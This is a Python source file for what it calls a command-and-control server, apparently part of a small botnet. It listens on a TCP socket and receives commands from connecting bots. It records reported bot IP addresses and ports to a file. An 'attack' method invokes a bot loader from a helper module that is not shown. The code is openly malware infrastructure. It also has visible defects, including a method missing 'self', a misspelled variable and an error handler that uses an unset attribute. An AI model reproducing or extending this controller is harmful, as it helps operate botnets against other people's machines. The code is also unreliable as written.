import socket
import sys
import ultils

class CnCServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def start(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
            print(f"[*] Listening on {self.host}:{self.port}")
        except Exception as e:
            print(f"[*] Listening on {self.host}:{self.port} failed: {e}")
            sys.exit(1)

    def accept(self):
        try:
            self.client, self.addr = self.sock.accept()
            print(f"[*] Accepted connection from {self.addr[0]}:{self.addr[1]}")
        except Exception as e:
            print(f"[*] Accepting connection from {self.addr[0]}:{self.addr[1]} failed: {e}")
            sys.exit(1)

    def receive_command(self):
        try:
            command = self.client.recv(1024).decode()
            print(f"[*] Command received: {command}")
            return command
        except Exception as e:
            print(f"[*] Command failed: {e}")
            sys.exit(1)

    def attack():
        try:
            ultils.load_bot()
        except Exception as e:
            print(f"[*] Data failed: {e}")
            sys.exit(1)

    def close(self):
        self.sock.close()
        print("[*] Connection closed")

    def closeConnect(self):
        self.client.close()

if __name__ == "__main__":
    target_ip = "192.168.85.134"
    target_port = 8060
    
    server = CnCServer(target_ip, target_port)
    server.start()
    while True:
        server.accept()
        command = server.receive_command()
        commnad, data =ultils.parse_command(command)
        if (commnad == ultils.SEND_INFO):
            ip_address, port = ultils.parse_socket_info(data)
            ultils.save_text_to_file(ip_address + ':' + str(port))
        try:
            server.closeConnect()
            print('Connection closed.')
        except Exception as e:
            print('Error occurred:', e)